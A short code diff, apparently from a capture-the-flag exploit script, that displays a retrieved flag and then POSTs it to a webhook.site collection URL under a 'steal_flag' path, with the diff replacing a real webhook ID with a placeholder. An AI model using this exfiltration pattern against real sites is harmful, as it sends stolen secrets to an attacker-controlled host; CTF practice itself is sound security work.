@@ -41,7 +41,7 @@
       output.textContent = 'Flag: ' + data.flag;
 
       // Send the flag back to your server for collection (change URL!)
-      await fetch('https://webhook.site/7498f4c8-d5fa-4c69-bd18-5aa2f9620fc1/steal_flag', {
+      await fetch('https://webhook.site/ABCD/steal_flag', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ flag: data.flag })
